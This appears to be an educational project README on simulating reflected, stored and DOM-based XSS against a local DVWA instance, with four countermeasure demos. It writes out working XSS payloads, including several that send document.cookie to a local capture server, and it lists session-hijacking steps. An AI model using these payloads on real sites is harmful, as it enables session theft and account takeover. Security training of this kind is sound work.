#  Multi-Stage XSS Attack Simulation

>  **STRICTLY FOR EDUCATIONAL PURPOSES ONLY**
> This project is intended solely for learning about web application security in a controlled, local environment. Never attempt these techniques on any system you do not own or have explicit written permission to test. Unauthorized use is illegal and unethical.

---

##  Objective

The goal of this project is to simulate and demonstrate Cross-Site Scripting (XSS) vulnerabilities across multiple stages — from basic script injection to advanced session hijacking — within a controlled local environment using DVWA (Damn Vulnerable Web Application).

The project covers all three major XSS types (Reflected, Stored, DOM-based), escalates each to real-world cookie theft, simulates session hijacking, and implements layered defensive countermeasures to show how each attack can be mitigated.

This project was designed to strengthen practical skills in:

- Understanding and exploiting XSS vulnerabilities
- Session cookie theft and session hijacking simulation
- Web application security testing in a safe environment
- Implementing and evaluating defensive countermeasures
- Python-based attack infrastructure development
- Secure web development practices

---

##  Preview

> Controlled local DVWA environment running Reflected, Stored, and DOM-based XSS attacks with a Python cookie capture server logging stolen session tokens in real time.

---

##  Skills Learned

- Practical understanding of Reflected, Stored, and DOM-based XSS vulnerabilities
- Crafting JavaScript payloads for proof-of-concept and cookie theft
- Setting up and operating a local HTTP server to capture exfiltrated data
- Session hijacking simulation using stolen PHPSESSID cookies
- Implementing HttpOnly cookies to prevent JavaScript cookie access
- Applying Content Security Policy (CSP) to block inline script execution
- Input sanitization using `htmlspecialchars()` and `filter_var()` in PHP
- Secure session management with regeneration, SameSite, and Strict Mode flags
- Evidence documentation and screenshot-based reporting

---

##  Tools & Technologies

| Tool / Technology | Purpose |
|---|---|
| DVWA | Deliberately vulnerable web application for safe testing |
| XAMPP | Local Apache + PHP + MySQL stack |
| Python 3 | Cookie capture server |
| Brave Browser | Testing and payload delivery |
| HTML | Payload and demo structure |
| JavaScript | XSS payloads and session hijack demo |
| PHP | Countermeasure demonstrations |
| HTTP Protocol | Cookie exfiltration channel |
| Kali Linux | Testing and development environment |

---

##  Features

-  **Reflected XSS** — Payload injected via input field, reflected immediately in response
-  **Stored XSS** — Malicious payload persisted in the database, executes on every page load
-  **DOM-Based XSS** — Payload injected directly through URL parameter manipulation
-  **Cookie Theft** — JavaScript payloads exfiltrate session cookies to a local capture server
-  **Session Hijacking** — Stolen PHPSESSID injected into attacker browser to impersonate victim
-  **Countermeasure 1** — HttpOnly cookies blocking JavaScript cookie access
-  **Countermeasure 2** — Content Security Policy blocking inline script execution
-  **Countermeasure 3** — Input sanitization neutralising malicious scripts into harmless text
-  **Countermeasure 4** — Secure session management with regeneration, SameSite, and Strict Mode

---

##  Project Structure

```
multi-stage-xss-attack-simulation/
├── demos/
│   ├── csp_demo.html           # Countermeasure 2 — CSP blocking inline scripts
│   ├── hijack_demo.html        # Session hijack simulation
│   ├── httponly_demo.php       # Countermeasure 1 — HttpOnly cookie demo
│   ├── sanitize_demo.php       # Countermeasure 3 — Input sanitization demo
│   └── session_demo.php        # Countermeasure 4 — Secure session management demo
├── docs/
│   └── README.md
├── payloads/
│   ├── reflected_xss.txt       # Reflected XSS payload reference
│   ├── stored_xss.txt          # Stored XSS payload reference
│   └── dom_xss.txt             # DOM-based XSS payload reference
├── report/
│   └── MeenakshiRajesh_Cyber_Major_Project.pdf
├── screenshots/                # Evidence screenshots (26 total)
└── server/
    └── server.py               # Python cookie capture server
```

---

##  Setup

### 1. Install XAMPP

```bash
# Download from https://www.apachefriends.org/
# Install with default settings, then start Apache and MySQL
```

### 2. Install and Configure DVWA

```bash
# Download from https://github.com/digininja/DVWA
# Extract to: /opt/lampp/htdocs/dvwa/   (Linux) or C:\xampp\htdocs\dvwa\ (Windows)

# Edit config file
nano /opt/lampp/htdocs/dvwa/config/config.inc.php
# Set: $_DVWA['db_password'] = 'p@ssw0rd';
```

### 3. Setup DVWA Database

```
http://localhost/dvwa/setup.php → Click "Create / Reset Database"
```

### 4. Login and Set Security Level

```
URL:      http://localhost/dvwa/
Username: admin
Password: password

Go to: DVWA Security → Security Level → Low → Submit
```

### 5. Copy Demo Files to Web Root

```bash
sudo cp demos/*.php demos/*.html /opt/lampp/htdocs/countermeasures/
```

### 6. Start Cookie Capture Server

```bash
cd server/
python3 server.py
# Runs on http://localhost:8000
# Logs saved to server/stolen_cookies.log
```

Test the server:
```
http://localhost:8000/test?c=hello
# Terminal should show: ✅ Cookie captured successfully!
```

---

##  Attack Stages

### Stage 1 — Basic XSS (Alert Boxes)

| Type | Location | Payload |
|---|---|---|
| Reflected | DVWA → XSS (Reflected) → name field | `<script>alert('XSS Reflected')</script>` |
| Stored | DVWA → XSS (Stored) → message field | `<script>alert('XSS Stored')</script>` |
| DOM-based | URL parameter manipulation | `?default=<script>alert('DOM XSS')</script>` |

### Stage 2 — Advanced XSS (Cookie Theft)

| Type | Payload |
|---|---|
| Reflected | `<script>new Image().src='http://localhost:8000/?c='+document.cookie</script>` |
| Stored | `Hacker<script>new Image().src='http://localhost:8000/?c='+document.cookie</script>` |
| DOM-based | `?default=<script>new Image().src='http://localhost:8000/?c='+document.cookie</script>` |

> **Stored XSS note:** Right-click the Name field → Inspect → change `maxlength="10"` to `maxlength="100"` to fit the payload.

### Stage 3 — Session Hijacking

```
1. Retrieve stolen PHPSESSID from server/stolen_cookies.log
2. Open demos/hijack_demo.html in browser
3. Paste stolen PHPSESSID and click "Inject Stolen Cookie"
4. Navigate to http://localhost/dvwa/ — server recognises the hijacked session
```

---

##  Countermeasures

| # | Defense | Demo File | What It Does |
|---|---|---|---|
| 1 | HttpOnly Cookies | `demos/httponly_demo.php` | Prevents `document.cookie` from reading session tokens |
| 2 | Content Security Policy | `demos/csp_demo.html` | Blocks inline `<script>` execution entirely |
| 3 | Input Sanitization | `demos/sanitize_demo.php` | Converts `<script>` to harmless HTML entities |
| 4 | Secure Session Management | `demos/session_demo.php` | Combines HttpOnly, SameSite, Strict Mode, and regeneration |

Access demos at:
```
http://localhost/countermeasures/httponly_demo.php
http://localhost/countermeasures/csp_demo.html
http://localhost/countermeasures/sanitize_demo.php
http://localhost/countermeasures/session_demo.php
```

---

##  Attack & Payload Reference

| File | Contents |
|---|---|
| `payloads/reflected_xss.txt` | Basic alert and cookie theft payloads for Reflected XSS |
| `payloads/stored_xss.txt` | Basic alert and cookie theft payloads for Stored XSS |
| `payloads/dom_xss.txt` | Basic alert and cookie theft URLs for DOM-based XSS |

---

##  Cookie Capture Server

The Python server in `server/server.py` listens on port `8000` and logs any cookie data sent to it via the `?c=` query parameter.

```bash
cd server/
python3 server.py
```

Captured cookies are saved to `server/stolen_cookies.log` in the format:

```
========================================
Time: 2025-12-28 07:59:36
IP Address: 127.0.0.1
Cookie Stolen: PHPSESSID=p219s14q6qmtbre7e5qafto2o9; security=low
========================================
```

---

##  Dependencies

| Package | Purpose | Install |
|---|---|---|
| Python 3 | Cookie capture server | Pre-installed on Kali |
| XAMPP | Apache + PHP + MySQL | https://www.apachefriends.org/ |
| DVWA | Vulnerable test application | https://github.com/digininja/DVWA |

No additional Python packages are required — the server uses only the standard library (`http.server`, `urllib`, `datetime`).

---

##  Security & Legal Notes

- **This project must only be run on your own local machine in a controlled environment.**
- DVWA is intentionally vulnerable — **never deploy it on a public server or expose it to a network.**
- The cookie capture server logs real session data — **keep this strictly local.**
- Passwords and session IDs shown in screenshots are from a local test environment only.
- Session hijacking, cookie theft, and XSS exploitation against real websites without permission is **illegal** under computer misuse laws in most jurisdictions.

---

##  Author

**Meenakshi Rajesh**


---

##  License

This project is for educational use only. See `LICENSE` for details.
